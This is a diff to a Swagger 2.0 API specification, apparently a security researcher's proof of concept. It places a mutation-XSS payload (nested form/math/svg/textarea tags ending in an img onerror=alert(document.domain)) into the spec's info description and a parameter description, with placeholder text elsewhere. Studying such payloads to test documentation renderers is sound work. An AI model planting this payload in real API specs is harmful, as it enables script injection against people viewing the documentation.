@@ -1,9 +1,10 @@
+---
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: 'tuwklejxss
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
 
-    '
   version: production
 basePath: https://afine.com
 produces:
@@ -21,15 +22,15 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - accounts
+      - somettext
       operationId: findAccounts
-      summary: Finds all accounts
+      summary: this is example text
   "/malformed_by_afine":
     delete:
       parameters:
-      - description: 'tuwklejxss
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
 
-          '
         format: int64
         in: path
         name: id
@@ -44,7 +45,7 @@ paths:
       summary: afine
     get:
       parameters:
-      - description: Id value to filter by
+      - description: this is example text
         format: int64
         in: path
         name: id
@@ -54,6 +55,6 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - accounts
-      operationId: findGroupsById
-      summary: Finds groups by id
+      - afine
+      operationId: some_operation
+      summary: this is example text
